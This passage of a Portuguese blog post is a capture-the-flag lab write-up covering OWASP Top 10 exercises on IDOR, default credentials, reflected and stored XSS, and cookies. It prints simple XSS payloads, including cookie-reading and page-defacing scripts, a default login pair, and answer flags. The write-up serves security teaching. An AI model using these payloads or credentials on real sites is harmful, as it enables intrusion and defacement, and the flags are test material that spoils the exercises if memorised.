+&lt;p&gt;Um atacante simplesmente altera o número do parâmetro para qualquer outro e, assim, obtém acesso a outra conta.&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pstmt.setString(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, request.getParameter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;acct&amp;#34;&lt;/span&gt;));
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ResultSet results &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pstmt.executeQuery( );&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copiar código&#34;
+    aria-label=&#34;Copiar código&#34;
+    data-copied-label=&#34;Copiado!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;No segundo cenário o atacante alterar o endereço, forçando páginas que possivelmente existem.&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;http://example.com/app/getappInfo
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;http://example.com/app/admin_getappInfo&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copiar código&#34;
+    aria-label=&#34;Copiar código&#34;
+    data-copied-label=&#34;Copiado!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;h3 data-hextra-search-id=&#34;idor&#34;&gt;IDOR&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;idor&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#idor&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;IDOR (Insecure Direct Object Reference) é a forma de explorar falhas de configuração através do input do usuário, permitindo acessar objetos que, em teoria, o usuário não poderia acessar.&lt;/p&gt;
+&lt;h4 data-hextra-search-id=&#34;perguntas-5&#34;&gt;Perguntas&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;perguntas-5&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#perguntas-5&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;Read and understand how IDOR works.&lt;/strong&gt;&lt;br&gt;
+Resposta: não é necessário.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Deploy the machine and go to http://machine_ip/ - Login with the username being noot and the password test1234.&lt;/strong&gt;&lt;br&gt;
+Resposta:  Não é necessário responder&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Look at other users notes. What is the flag?&lt;/strong&gt;&lt;br&gt;
+Usando no parâmetro o valor &lt;code&gt;0&lt;/code&gt; acessamos uma nota que não é nossa.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/01/OWASPTOP10/OWASPTOP10-parametro.webp&#34; alt=&#34;notes&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Resposta:&lt;code&gt;flag{fivefourthree}&lt;/code&gt;&lt;/p&gt;
+&lt;h2 data-hextra-search-id=&#34;configuração-de-segurança-incorreta&#34;&gt;Configuração de segurança incorreta&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;configuração-de-segurança-incorreta&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#configura%c3%a7%c3%a3o-de-seguran%c3%a7a-incorreta&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Isso ocorre quando o responsável pela aplicação acredita que realizou uma configuração adequada, mas na verdade não fez.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Serviços de cloud mal configurados, ex: S3 buckets.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Serviços, páginas ou contas desnecessários, ativados.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Contas padrão com senhas inalteradas (senhas padrão).&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Detalhamento excessivo em mensagens de erro.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Não uso de cabeçalhos de segurança no HTTP ou revelação de muitos detalhes nos cabeçalhos do HTTP.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 data-hextra-search-id=&#34;perguntas-6&#34;&gt;Perguntas&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;perguntas-6&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#perguntas-6&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Deploy the VM&lt;/strong&gt;&lt;br&gt;
+Resposta: não é necessário responder.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Hack into the webapp, and find the flag!&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Procurando pela documentação da aplicação na internet: &lt;code&gt;Pensive notes&lt;/code&gt;&lt;br&gt;
+Encontramos as credenciais padrão para acessá-lo: &lt;code&gt;pensive:PensiveNotes&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Resposta: &lt;code&gt;thm{4b9513968fd564a87b28aa1f9d672e17}&lt;/code&gt;&lt;/p&gt;
+&lt;h2 data-hextra-search-id=&#34;cross-site-scripting&#34;&gt;Cross-site Scripting&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;cross-site-scripting&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#cross-site-scripting&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Também conhecido como XSS, é uma vulnerabilidade comum em aplicações web. Trata-se de um tipo de injeção de código malicioso.&lt;/p&gt;
+&lt;p&gt;XSS é possível em JavaScript, VBScript, Flash e CSS. Existem três principais tipos de cross-site scripting:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Stored XSS:&lt;/strong&gt; O mais perigoso, onde uma string maliciosa se origina do banco de dados do site. Isso acontece porque o site não verifica os inputs enviados.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Reflected XSS:&lt;/strong&gt; O site inclui o payload na requisição que será enviada para o usuário.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;DOM-Based XSS:&lt;/strong&gt; DOM é um padrão de &lt;em&gt;Document Object Model&lt;/em&gt; e uma interface de programação para documentos HTML e XML.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 data-hextra-search-id=&#34;xss-payloads&#34;&gt;XSS Payloads&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;xss-payloads&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#xss-payloads&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Cross-site scripting é uma vulnerabilidade que pode ser explorada através da execução de Javascript na máquina da vítima, abaixo alguns tipos de payloads:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Popup&amp;rsquo;s:&lt;/strong&gt; &lt;code&gt;(&amp;lt;script&amp;gt;alert(“Hello World”)&amp;lt;/script&amp;gt;)&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Escrevendo HTML:&lt;/strong&gt; &lt;code&gt;(document.write)&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;XSS Keylogger&lt;/strong&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Port Scanning&lt;/strong&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 data-hextra-search-id=&#34;xsschallenge&#34;&gt;XSS Challenge&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;xsschallenge&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#xsschallenge&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;h4 data-hextra-search-id=&#34;perguntas-7&#34;&gt;Perguntas&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;perguntas-7&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#perguntas-7&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;Navigate to &lt;code&gt;http://MACHINE-IP&lt;/code&gt; your browser and click on the &amp;ldquo;Reflected XSS&amp;rdquo; tab on the navbar;craft a reflected XSS payload that will cause a popup saying &amp;ldquo;Hello&amp;rdquo;.&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Payload: &lt;code&gt;(&amp;lt;script&amp;gt;alert(“Hello World”)&amp;lt;/script&amp;gt;)&lt;/code&gt;&lt;br&gt;
+Resposta: &lt;code&gt;ThereIsMoreToXSSThanYouThink&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;On the same reflective page, craft a reflected XSS payload that will cause a popup with your machines IP address.&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Payload:&lt;code&gt;(&amp;lt;script&amp;gt;alert(window.location.hostname)&amp;lt;/script&amp;gt;)&lt;/code&gt;&lt;br&gt;
+Resposta:&lt;code&gt;ReflectiveXss4TheWin&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Now navigate to &lt;code&gt;http://MACHINE-IP&lt;/code&gt; in your browser and click on the &amp;ldquo;Stored XSS&amp;rdquo; tab on the navbar; make an account.&lt;/strong&gt;&lt;br&gt;
+&lt;strong&gt;Then add a comment and see if you can insert some of your own HTML.&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;O exercício mostra de uma forma prática como ocorre um ataque de &amp;ldquo;stored XSS&amp;rdquo;.
+Primeiro precisamos nos registrar.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/01/OWASPTOP10/OWASPTOP10-register.webp&#34; alt=&#34;register&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Nas dicas que são fornecidas realizaremos o passo a passo.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/01/OWASPTOP10/question-hint.webp&#34; alt=&#34;question hints&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Através da console da ferramenta de desenvolvimento descobrimos nosso cookie.&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;document.&lt;span style=&#34;color:#a6e22e&#34;&gt;cookie&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;connect.sid=s%3AoxbrDUO81RnvOy3GC3RfSCe6WxniIiqH.3YTT4pZ8t4eLsNhJngjZPdDDRYJ7jhZTZIzkt1ZH8eo&amp;#34;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copiar código&#34;
+    aria-label=&#34;Copiar código&#34;
+    data-copied-label=&#34;Copiado!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;Com o comando fornecido na dica alteramos o valor, da primeira tag &lt;code&gt;#thm-title&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;document.&lt;span style=&#34;color:#a6e22e&#34;&gt;querySelector&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;#thm-title&amp;#39;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;textContent&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;hey&amp;#34;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copiar código&#34;
+    aria-label=&#34;Copiar código&#34;
+    data-copied-label=&#34;Copiado!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/01/OWASPTOP10/hey.webp&#34; alt=&#34;hey&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Agora basta seguirmos os passos seguintes e obteremos nossa resposta.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/01/OWASPTOP10/question%20steps.webp&#34; alt=&#34;question step&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Resposta: &lt;code&gt;HTML_T4gs&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;On the same page, create an alert popup box appear on the page with your document cookies.&lt;/strong&gt;&lt;br&gt;
+Payload: &lt;code&gt;&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;inserindo o payload nos comentários obtemos nossa resposta.&lt;/p&gt;
+&lt;p&gt;Resposta: &lt;code&gt;W3LL_D0N3_LVL2&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Change &amp;ldquo;XSS Playground&amp;rdquo; to &amp;ldquo;I am a hacker&amp;rdquo; by adding a comment and using Javascript.&lt;/strong&gt;&lt;br&gt;
+Payload: &lt;code&gt;&amp;lt;script&amp;gt;document.querySelector(&#39;#thm-title&#39;).textContent = &#39;I am a hacker&#39;&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Resposta:&lt;code&gt;websites_can_be_easily_defaced_with_xss&lt;/code&gt;&lt;/p&gt;
+&lt;h2 data-hextra-search-id=&#34;desserialização-insegura&#34;&gt;Desserialização insegura&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;desserialização-insegura&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#desserializa%c3%a7%c3%a3o-insegura&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;A desserialização insegura é a substituição de dados processados ​​por um aplicativo por código malicioso, permitindo desde DoS (Negação de Serviço) até RCE (Execução Remota de Código). Qualquer aplicativo que armazena ou busca dados, onde não há validações ou verificações de integridade em vigor para os dados consultados ou retidos, pode ser vulnerável. Alguns exemplos de aplicativos dessa natureza são:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Sites de comércio eletrônico&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Fóruns&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;APIs&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Application Runtimes (Tomcat, Jenkins, Jboss, etc.)&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 data-hextra-search-id=&#34;perguntas-8&#34;&gt;Perguntas&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;perguntas-8&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#perguntas-8&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Who developed the Tomcat application?&lt;/strong&gt;
+Resposta:&lt;code&gt;The Apache Software Foundation&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;What type of attack that crashes services can be performed with insecure deserialization?&lt;/strong&gt;
+Resposta:&lt;code&gt;Denial of Service&lt;/code&gt;&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;objetos&#34;&gt;Objetos&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;objetos&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#objetos&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Elementos que são utilizados em linguagem orientada a objetos, são compostos por &lt;code&gt;estado&lt;/code&gt;e &lt;code&gt;comportamento&lt;/code&gt;.
+A vantagem da utilização de objetos é que evitamos reescrever códigos semelhantes.&lt;/p&gt;
+&lt;h4 data-hextra-search-id=&#34;pergunta&#34;&gt;Pergunta&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;pergunta&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#pergunta&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;if a dog was sleeping, would this be:&lt;/strong&gt;&lt;br&gt;
+A) A State&lt;br&gt;
+B) A Behaviour&lt;/p&gt;
+&lt;p&gt;Resposta:&lt;code&gt;A Behaviour&lt;/code&gt;&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;desserialização&#34;&gt;Desserialização&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;desserialização&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#desserializa%c3%a7%c3%a3o&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Desserialização é um processo onde dados que foram previamente serializados (ou seja, convertidos em um formato que pode ser facilmente armazenado ou transmitido) são convertidos de volta ao seu estado original. Um exemplo, conforme mostrado na aula, seria a transmissão de uma senha de um computador para o outro: a string é convertida para binário (serializado) e depois é desserializada novamente para string.&lt;/p&gt;
+&lt;h4 data-hextra-search-id=&#34;pergunta-1&#34;&gt;Pergunta&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;pergunta-1&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#pergunta-1&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;What is the name of the base-2 formatting that data is sent across a network as?&lt;/strong&gt;&lt;br&gt;
+Resposta:&lt;code&gt;Binary&lt;/code&gt;&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;cookies&#34;&gt;Cookies&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;cookies&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#cookies&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Através dos cookies, conseguimos guardar específicos comportamentos de cada usuário, cookies de sessão normalmente são limpos quando o navegador é fechado, o tempo de validade de um cookie é determinado pelo campo &lt;code&gt;Expiry&lt;/code&gt;, outros campos abaixo.&lt;/p&gt;
+&lt;table&gt;
+	&lt;thead&gt;
+			&lt;tr&gt;
+					&lt;th&gt;Atributo&lt;/th&gt;
+					&lt;th&gt;Descrição&lt;/th&gt;
+					&lt;th&gt;Obrigatório ?&lt;/th&gt;
+			&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Cookie Name&lt;/td&gt;
+					&lt;td&gt;O nome do Cook&lt;/td&gt;
+					&lt;td&gt;Sim&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Cookie Value&lt;/td&gt;
+					&lt;td&gt;Valor a ser definido, texto claro ou encodado&lt;/td&gt;
+					&lt;td&gt;Sim&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Secure Only&lt;/td&gt;
+					&lt;td&gt;Define se o cookie será utilizado somente em conexões H&lt;/td&gt;
+					&lt;td&gt;Não&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Expiry&lt;/td&gt;
+					&lt;td&gt;Define o timestamp, tempo, quando cookie será rem&lt;/td&gt;
+					&lt;td&gt;Não&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Path     O cookie será enviado somente para URL especificada na requisição  sição&lt;/td&gt;
+					&lt;td&gt;&lt;/td&gt;
+					&lt;td&gt;&lt;/td&gt;
+			&lt;/tr&gt;
+	&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 data-hextra-search-id=&#34;criação-do-cookie&#34;&gt;Criação do Cookie&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;criação-do-cookie&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#cria%c3%a7%c3%a3o-do-cookie&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Exemplo abaixo, fornecido na aula, é criado um cookie utilizando Python, onde o valor é definido sendo a hora de agora e seu nome será &lt;code&gt;registrationTimestamp&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/01/OWASPTOP10/timestamp.webp&#34; alt=&#34;timestamp&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/01/OWASPTOP10/cookie-value.webp&#34; alt=&#34;timestamp&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;h4 data-hextra-search-id=&#34;perguntas-9&#34;&gt;Perguntas&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;perguntas-9&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#perguntas-9&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;If a cookie had the path of &lt;code&gt;webapp.com/login&lt;/code&gt; , what would the URL that the user has to visit be?&lt;/strong&gt;&lt;br&gt;
+Resposta:&lt;code&gt;webapp.com/login&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;What is the acronym for the web technology that &lt;em&gt;Secure&lt;/em&gt; cookies work over?&lt;/strong&gt;&lt;br&gt;
+Resposta:&lt;code&gt;HTTPS&lt;/code&gt;&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;prática---cookies&#34;&gt;Prática - Cookies&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;prática---cookies&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#pr%c3%a1tica---cookies&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Depois de criarmos uma conta de usuário verificamos nosso &lt;em&gt;cookie&lt;/em&gt; na própria ferramenta do navegador.
+Os cookies estão em texto claro e encodado em base64.&lt;/p&gt;
